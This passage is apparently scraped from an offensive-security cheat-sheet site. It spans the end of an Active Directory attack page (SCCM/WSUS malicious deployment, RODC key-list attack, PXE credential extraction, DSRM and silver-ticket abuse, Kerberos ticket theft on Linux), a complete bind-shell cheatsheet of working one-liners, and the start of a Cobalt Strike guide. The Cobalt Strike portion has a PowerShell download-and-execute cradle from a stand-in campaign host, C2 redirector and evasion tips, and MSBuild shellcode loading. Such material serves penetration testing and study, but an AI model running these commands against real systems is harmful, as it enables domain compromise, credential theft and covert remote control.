can use an all-in-one tool : Exchange2domain.\ngit clone github.com/Ridter/Exchange2domain python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip SCCM Deployment # SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.\nPowerSCCM - PowerShell module to interact with SCCM deployments\nMalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage\nCompromise client, use locate to find management server\nMalSCCM.exe locate Enumerate over WMI as an administrator of the Distribution Point\nMalSCCM.exe inspect /server:\u0026lt;DistributionPoint Server FQDN\u0026gt; /groups Compromise management server, use locate to find primary server\nUse inspect on primary server to view who you can target\nMalSCCM.exe inspect /all MalSCCM.exe inspect /computers MalSCCM.exe inspect /primaryusers MalSCCM.exe inspect /groups Create a new device group for the machines you want to laterally move too\nMalSCCM.exe group /create /groupname:TargetGroup /grouptype:device MalSCCM.exe inspect /groups Add your targets into the new group\nMalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL Create an application pointing to a malicious EXE on a world readable share : SCCMContentLib$\nMalSCCM.exe app /create /name:demoapp /uncpath:\u0026#34;\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\u0026#34; MalSCCM.exe inspect /applications Deploy the application to the target group\nMalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment MalSCCM.exe inspect /deployments Force the target group to checkin for updates\nMalSCCM.exe checkin /groupname:TargetGroup Cleanup the application, deployment and group\nMalSCCM.exe app /cleanup /name:demoapp MalSCCM.exe group /delete /groupname:TargetGroup SCCM Network Access Accounts # If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.\nFind SCCM blob Get-Wmiobject -namespace \u0026#34;root\\ccm\\policy\\Machine\\ActualConfig\u0026#34; -class \u0026#34;CCM_NetworkAccessAccount\u0026#34; NetworkAccessPassword : \u0026lt;![CDATA[E600000001...8C6B5]]\u0026gt; NetworkAccessUsername : \u0026lt;![CDATA[E600000001...00F92]]\u0026gt; Using SharpDPAPI for SCCM retrieval and decryption .\\SharpDPAPI.exe SCCM Check ACL for the CIM repository located at C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA: Get-Acl C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA | Format-List -Property PSPath,sddl ConvertFrom-SddlString \u0026#34;\u0026#34; WSUS Deployment # Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network\n:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.\nSharpWSUS Locate using HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate or SharpWSUS.exe locate After WSUS Server compromise: SharpWSUS.exe inspect Create a malicious patch: SharpWSUS.exe create /payload:\u0026quot;C:\\Users\\ben\\Documents\\pk\\psexec.exe\u0026quot; /args:\u0026quot;-accepteula -s -d cmd.exe /c \\\u0026quot;net user WSUSDemo Password123! /add ^\u0026amp; net localgroup administrators WSUSDemo /add\\\u0026quot;\u0026quot; /title:\u0026quot;WSUSDemo\u0026quot; Deploy it on the target: SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u0026quot;Demo Group\u0026quot; Check status deployment: SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local Clean up: SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group RODC - Read Only Domain Controller Compromise # If the user is included in the Allowed RODC Password Replication, their credentials are stored in the server, and the msDS-RevealedList attribute of the RODC is populated with the username.\nRequirements:\nImpacket PR #1210 - The Kerberos Key List Attack krbtgt credentials of the RODC (-rodcKey) ID of the krbtgt account of the RODC (-rodcNo) Exploitation:\n# keylistattack.py using SAMR user enumeration without filtering (-full flag) keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full # keylistattack.py defining a target username (-t flag) keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST # secretsdump.py using the Kerberos Key List Attack option (-use-keylist) secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist PXE Boot image attack # PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.\nPress [F8] during the PXE boot to spawn an administrator console on the deployed machine.\nPress [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.\nnet user hacker Password123! /add net localgroup administrators /add hacker Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.\n# Import the module PS \u0026gt; Import-Module .\\PowerPXE.ps1 # Start the exploit on the Ethernet interface PS \u0026gt; Get-PXEcreds -InterfaceAlias Ethernet PS \u0026gt; Get-PXECreds -InterfaceAlias « lab 0 » # Wait for the DHCP to get an address \u0026gt;\u0026gt; Get a valid IP address \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; DHCP proposal IP address: 192.168.22.101 \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; DHCP Validation: DHCPACK \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; IP address configured: 192.168.22.101 # Extract BCD path from the DHCP response \u0026gt;\u0026gt; Request BCD File path \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; BCD File path: \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; TFTP IP Address: 192.168.22.3 # Download the BCD file and extract wim files \u0026gt;\u0026gt; Launch TFTP download \u0026gt;\u0026gt;\u0026gt;\u0026gt; Transfer succeeded. \u0026gt;\u0026gt; Parse the BCD file: conf.bcd \u0026gt;\u0026gt;\u0026gt;\u0026gt; Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim \u0026gt;\u0026gt;\u0026gt;\u0026gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \u0026gt;\u0026gt; Launch TFTP download \u0026gt;\u0026gt;\u0026gt;\u0026gt; Transfer succeeded. # Parse wim files to find interesting data \u0026gt;\u0026gt; Open LiteTouchPE_x86.wim \u0026gt;\u0026gt;\u0026gt;\u0026gt; Finding Bootstrap.ini \u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt;\u0026gt; DeployRoot = \\\\LAB-MDT\\DeploymentShare$ \u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt;\u0026gt; UserID = MdtService \u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt;\u0026gt; UserPassword = Somepass1 DNS Reconnaissance # Perform ADIDNS searches\nStandIn.exe --dns --limit 20 StandIn.exe --dns --filter SQL --limit 10 StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e DSRM Credentials # Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.\nThis is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39; # Check if the key exists and get the value Get-ItemProperty \u0026#34;HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\u0026#34; -name DsrmAdminLogonBehavior # Create key with value \u0026#34;2\u0026#34; if it doesn\u0026#39;t exist New-ItemProperty \u0026#34;HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\u0026#34; -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD # Change value to \u0026#34;2\u0026#34; Set-ItemProperty \u0026#34;HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\u0026#34; -name DsrmAdminLogonBehavior -value 2 Impersonating Office 365 Users on Azure AD Connect # Prerequisites:\nObtain NTLM password hash of the AZUREADSSOACC account\nmimikatz.exe \u0026#34;lsadump::dcsync /user:AZUREADSSOACC$\u0026#34; exit AAD logon name of the user we want to impersonate (userPrincipalName or mail)\nelrond@contoso.com SID of the user we want to impersonate\nS-1-5-21-2121516926-2695913149-3163778339-1234 Create the Silver Ticket and inject it into Kerberos cache:\nmimikatz.exe \u0026#34;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\u0026#34; exit Launch Mozilla Firefox, go to about:config\nnetwork.negotiate-auth.trusted-uris=\u0026#34;https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com\u0026#34;. Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.\nLinux Active Directory # CCACHE ticket reuse from /tmp # When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions\nList the current ticket used for authentication with env | grep KRB5CCNAME. The format is portable and the ticket can be reused by setting the environment variable with export KRB5CCNAME=/tmp/ticket.ccache. Kerberos ticket name format is krb5cc_%{uid} where uid is the user UID.\n$ ls /tmp/ | grep krb5cc krb5cc_1000 krb5cc_1569901113 krb5cc_1569901115 $ export KRB5CCNAME=/tmp/krb5cc_1569901115 CCACHE ticket reuse from keyring # Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey\n# Configuration and build git clone https://github.com/TarlogicSecurity/tickey cd tickey/tickey make CONF=Release [root@Lab-LSV01 /]# /tmp/tickey -i [*] krb5 ccache_name = KEYRING:session:sess_%{uid} [+] root detected, so... DUMP ALL THE TICKETS!! [*] Trying to inject in tarlogic[1000] session... [+] Successful injection at process 25723 of tarlogic[1000],look for tickets in /tmp/__krb_1000.ccache [*] Trying to inject in velociraptor[1120601115] session... [+] Successful injection at process 25794 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache [*] Trying to inject in trex[1120601113] session... [+] Successful injection at process 25820 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache [X] [uid:0] Error retrieving tickets CCACHE ticket reuse from SSSD KCM # SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By default, the key is only readable if you have root permissions.\nInvoking SSSDKCMExtractor with the \u0026ndash;database and \u0026ndash;key parameters will parse the database and decrypt the secrets.\ngit clone https://github.com/fireeye/SSSDKCMExtractor python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey The credential cache Kerberos blob can be converted into a usable Kerberos CCache file that can be passed to Mimikatz/Rubeus.\nCCACHE ticket reuse from keytab # git clone https://github.com/its-a-feature/KeytabParser python KeytabParser.py /etc/krb5.keytab klist -k /etc/krb5.keytab Extract accounts from /etc/krb5.keytab # The service keys used by services that run as root are usually stored in the keytab file /etc/krb5.keytab. This service key is the equivalent of the service\u0026rsquo;s password, and must be kept secure.\nUse klist to read the keytab file and parse its content. The key that you see when the key type is 23 is the actual NT Hash of the user.\n$ klist.exe -t -K -e -k FILE:C:\\Users\\User\\downloads\\krb5.keytab [...] [26] Service principal: host/COMPUTER@DOMAIN KVNO: 25 Key type: 23 Key: 31d6cfe0d16ae931b73c59d7e0c089c0 Time stamp: Oct 07, 2019 09:12:02 [...] On Linux you can use KeyTabExtract: we want RC4 HMAC hash to reuse the NLTM hash.\n$ python3 keytabextract.py krb5.keytab [!] No RC4-HMAC located. Unable to extract NTLM hashes. # No luck [+] Keytab File successfully imported. REALM : DOMAIN SERVICE PRINCIPAL : host/computer.domain NTLM HASH : 31d6cfe0d16ae931b73c59d7e0c089c0 # Lucky On macOS you can use bifrost.\n./bifrost -action dump -source keytab -path test Connect to the machine using the account and the hash with CME.\n$ crackmapexec 10.XXX.XXX.XXX -u \u0026#39;COMPUTER$\u0026#39; -H \u0026#34;31d6cfe0d16ae931b73c59d7e0c089c0\u0026#34; -d \u0026#34;DOMAIN\u0026#34; CME 10.XXX.XXX.XXX:445 HOSTNAME-01 [+] DOMAIN\\COMPUTER$ 31d6cfe0d16ae931b73c59d7e0c089c0 References # Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema Abusing Kerberos: Kerberoasting - Haboob Team Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 \u0026amp; @5ub34x Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh BlueHat IL - Benjamin Delpy COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss DiskShadow The return of VSS Evasion Persistence and AD DB extraction Domain Penetration Testing: Using BloodHound, Crackmapexec, \u0026amp; Mimikatz to get Domain Admin Dumping Domain Password Hashes - Pentestlab Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace Exploiting PrivExchange - April 11, 2019 - @chryzsh Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019 Finding Passwords in SYSVOL \u0026amp; Exploiting Group Policy Preferences How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf Fun with LDAP, Kerberos (and MSRPC) in AD Environments Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r Golden ticket - Pentestlab How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff Hunting in Active Directory: Unconstrained Delegation \u0026amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018 Invoke-Kerberoast - Powersploit Read the docs Kerberoasting - Part 1 - Mubix “Rob” Fuller Passing the hash with native RDP client (mstsc.exe) Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView) Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView Pen Testing Active Directory Environments - Part III: Chasing Power Users Pen Testing Active Directory Environments - Part IV: Graph Fun Pen Testing Active Directory Environments - Part V: Admins and Graphs Pen Testing Active Directory Environments - Part VI: The Final Case Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave Roasting AS-REPs - January 17, 2017 - harmj0y Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher Using bloodhound to map the user network - Hausec WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN WONKACHALL AKERVA NDH2018 – WRITE UP PART 1 WONKACHALL AKERVA NDH2018 – WRITE UP PART 2 WONKACHALL AKERVA NDH2018 – WRITE UP PART 3 WONKACHALL AKERVA NDH2018 – WRITE UP PART 4 WONKACHALL AKERVA NDH2018 – WRITE UP PART 5 Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami [PrivExchange] From user to domain admin in less than 60sec ! - davy Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018 Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon Playing with Relayed Credentials - June 27, 2018 Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019 How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0 Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10 Active-Directory-Exploitation-Cheat-Sheet - @buftas GPO Abuse - Part 1 - RastaMouse - 6 January 2019 GPO Abuse - Part 2 - RastaMouse - 13 January 2019 Abusing GPO Permissions - harmj0y - March 17, 2016 How To Attack Kerberos 101 - m0chan - July 31, 2019 ACE to RCE - @JustinPerdok - July 24, 2020 Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020 Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020 CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020 Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory GPO Abuse: \u0026ldquo;You can\u0026rsquo;t see me\u0026rdquo; - Huy Kha - July 19, 2019 Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017 New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018 Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17 Playing with PrintNightmare - 0xdf - Jul 8, 2021 Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29 Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021 Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021 NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_ Certified Pre-Owned - Will Schroeder - Jun 17 2021 AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021 NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021 UnPAC the hash - The Hacker Recipes Lateral Movement – WebClient Shadow Credentials: Workstation Takeover Edition - Matthew Creel Certificate templates - The Hacker Recipes CA configuration - The Hacker Recipes Access controls - The Hacker Recipes Web endpoints - The Hacker Recipes sAMAccountName spoofing - The Hacker Recipes CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph ADCS: Playing with ESC4 - Matthew Creel The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022 AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022 Introducing MalSCCM - Phil Keeble -May 4, 2022 Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak bloodyAD and CVE-2022-26923 - soka - 11 May 2022 DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal Shadow Credentials - The Hacker Recipes Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015 The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28 "},{"id":7,"href":"/docs/bind_shell_cheatsheet/","title":"Bind Shell Cheatsheet","section":"Docs","content":" Bind Shell # Perl # perl -e \u0026#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));\\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\\ close C){open(STDIN,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;C\u0026#34;);exec(\u0026#34;/bin/bash -i\u0026#34;);};\u0026#39; Python # Single line :\npython -c \u0026#39;exec(\u0026#34;\u0026#34;\u0026#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\u0026#34;0.0.0.0\u0026#34;,51337));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\u0026#34;\u0026#34;\u0026#34;)\u0026#39; Expanded version :\nimport socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((\u0026#34;0.0.0.0\u0026#34;, 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read()) PHP # php -r \u0026#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\u0026#34;0.0.0.0\u0026#34;,51337);\\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\u0026#34;$ \u0026#34;,2))exit;\\ $in=socket_read($cl,100);$cmd=popen(\u0026#34;$in\u0026#34;,\u0026#34;r\u0026#34;);while(!feof($cmd)){$m=fgetc($cmd);\\ socket_write($cl,$m,strlen($m));}}\u0026#39; Ruby # ruby -rsocket -e \u0026#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;%d \u0026gt;\u0026amp;%d 2\u0026gt;\u0026amp;%d\u0026#34;,s,s,s)\u0026#39; Netcat Traditional # nc -nlvp 51337 -e /bin/bash Netcat OpenBsd # rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u0026gt;\u0026amp;1|nc -lvp 51337 \u0026gt;/tmp/f Socat # user@attacker$ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345 user@victim$ socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane Powershell # https://github.com/besimorhino/powercat # Victim (listen) . .\\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\\powercat.ps1 powercat -c 127.0.0.1 -p 7002 "},{"id":8,"href":"/docs/cobalt_strike_all_you_need/","title":"Cobalt Strike","section":"Docs","content":" Cobalt Strike # Cobalt Strike is threat emulation software. Red teams and penetration testers use Cobalt Strike to demonstrate the risk of a breach and evaluate mature security programs. Cobalt Strike exploits network vulnerabilities, launches spear phishing campaigns, hosts web drive-by attacks, and generates malware infected files from a powerful graphical user interface that encourages collaboration and reports all activity.\n$ sudo apt-get update $ sudo apt-get install openjdk-11-jdk $ sudo apt install proxychains socat $ sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 $ sudo ./teamserver 10.10.10.10 \u0026#34;password\u0026#34; [malleable C2 profile] $ ./cobaltstrike $ powershell.exe -nop -w hidden -c \u0026#34;IEX ((new-object net.webclient).downloadstring(\u0026#39;http://campaigns.example.com/download/dnsback\u0026#39;))\u0026#34; Summary # Infrastructure Redirectors Domain fronting OpSec Customer ID Payloads DNS Beacon SMB Beacon Metasploit compatibility Custom Payloads Malleable C2 Files Powershell and .NET Powershell commabds .NET remote execution Lateral Movement VPN \u0026amp; Pivots Kits Elevate Kit Persistence Kit Resource Kit Artifact Kit Mimikatz Kit Sleep Mask Kit Thread Stack Spoofer Beacon Object Files NTLM Relaying via Cobalt Strike References Infrastructure # Redirectors # sudo apt install socat socat TCP4-LISTEN:80,fork TCP4:[TEAM SERVER]:80 Domain Fronting # New Listener \u0026gt; HTTP Host Header Choose a domain in \u0026ldquo;Finance \u0026amp; Healthcare\u0026rdquo; sector OpSec # Don\u0026rsquo;t\nUse default self-signed HTTPS certificate Use default port (50050) Use 0.0.0.0 DNS response Metasploit compatibility, ask for a payload : wget -U \u0026quot;Internet Explorer\u0026quot; http://127.0.0.1/vl6D Do\nUse a redirector (Apache, CDN, \u0026hellip;) Firewall to only accept HTTP/S from the redirectors Firewall 50050 and access via SSH tunnel Edit default HTTP 404 page and Content type: text/plain No staging set hosts_stage to false in Malleable C2 Use Malleable Profile to taylor your attack to specific actors Customer ID # The Customer ID is a 4-byte number associated with a Cobalt Strike license key. Cobalt Strike 3.9 and later embed this information into the payload stagers and stages generated by Cobalt Strike.\nThe Customer ID value is the last 4-bytes of a Cobalt Strike payload stager in Cobalt Strike 3.9 and later. The trial has a Customer ID value of 0. Cobalt Strike does not use the Customer ID value in its network traffic or other parts of the tool Payloads # DNS Beacon # Edit the Zone File for the domain Create an A record for Cobalt Strike system Create an NS record that points to FQDN of your Cobalt Strike system Your Cobalt Strike team server system must be authoritative for the domains you specify. Create a DNS A record and point it to your Cobalt Strike team server. Use DNS NS records to delegate several domains or sub-domains to your Cobalt Strike team server\u0026rsquo;s A record.\nnslookup jibberish.beacon polling.campaigns.domain.com nslookup jibberish.beacon campaigns.domain.com Example of DNS on Digital Ocean:\nNS example.com directs to 10.10.10.10. 86400 NS polling.campaigns.example.com directs to campaigns.example.com.\t3600 A\tcampaigns.example.com directs to 10.10.10.10\t3600 systemctl disable systemd-resolved systemctl stop systemd-resolved rm /etc/resolv.conf echo \u0026#34;nameserver 8.8.8.8\u0026#34; \u0026gt; /etc/resolv.conf echo \u0026#34;nameserver 8.8.4.4\u0026#34; \u0026gt;\u0026gt; /etc/resolv.conf Configuration:\nhost: campaigns.domain.com beacon: polling.campaigns.domain.com Interact with a beacon, and sleep 0 SMB Beacon # link [host] [pipename] connect [host] [port] unlink [host] [PID] jump [exec] [host] [pipe] SMB Beacon uses Named Pipes. You might encounter these error code while running it.\nError Code Meaning Description 2 File Not Found There is no beacon for you to link to 5 Access is denied Invalid credentials or you don\u0026rsquo;t have permission 53 Bad Netpath You have no trust relationship with the target system. It may or may not be a beacon there. SSH Beacon # # deploy a beacon beacon\u0026gt; help ssh Use: ssh [target:port] [user] [pass] Spawn an SSH client and attempt to login to the specified target beacon\u0026gt; help ssh-key Use: ssh [target:port] [user] [/path/to/key.pem] Spawn an SSH client and attempt to login to the specified target # beacon\u0026#39;s commands upload Upload a file download Download a file socks Start SOCKS4a server to relay traffic sudo Run a command via sudo rportfwd Setup a reverse port forward shell Execute a command via the shell Metasploit compatibility # Payload: windows/meterpreter/reverse_http or windows/meterpreter/reverse_https Set LHOST and LPORT to the beacon Set DisablePayloadHandler to True Set PrependMigrate to True exploit -j Custom Payloads # https://ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c\n* Attacks \u0026gt; Packages \u0026gt; Payload Generator * Attacks \u0026gt; Packages \u0026gt; Scripted Web Delivery (S) $ python2 ./shellcode_encoder.py -cpp -cs -py payload.bin MySecretPassword xor $ C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe C:\\Windows\\Temp\\dns_raw_stageless_x64.xml $ %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe \\\\10.10.10.10\\Shared\\dns_raw_stageless_x86.xml Malleable C2 # List of Malleable Profiles hosted on Github\nCobalt Strike - Malleable C2 Profiles https://github.com/xx0hcd/Malleable-C2-Profiles Cobalt Strike Malleable C2 Design and Reference Guide https://github.com/threatexpress/malleable-c2 Malleable-C2-Profiles https://github.com/rsmudge/Malleable-C2-Profiles SourcePoint is a C2 profile generator https://github.com/Tylous/SourcePoint Example of syntax\nset useragent \u0026#34;SOME AGENT\u0026#34;; # GOOD set useragent \u0026#39;SOME AGENT\u0026#39;; # BAD prepend \u0026#34;This is an example;\u0026#34;; # Escape Double quotes append \u0026#34;here is \\\u0026#34;some\\\u0026#34; stuff\u0026#34;; # Escape Backslashes append \u0026#34;more \\\\ stuff\u0026#34;; # Some special characters do not need escaping prepend \u0026#34;!@#$%^\u0026amp;*()\u0026#34;; Check a profile with ./c2lint.\nA result of 0 is returned if c2lint completes with no errors A result of 1 is returned if c2lint completes with only warnings A result of 2 is returned if c2lint completes with only errors A result of 3 is returned if c2lint completes with both errors and warning Files # # List the file on the specified directory beacon \u0026gt; ls \u0026lt;C:\\Path\u0026gt; # 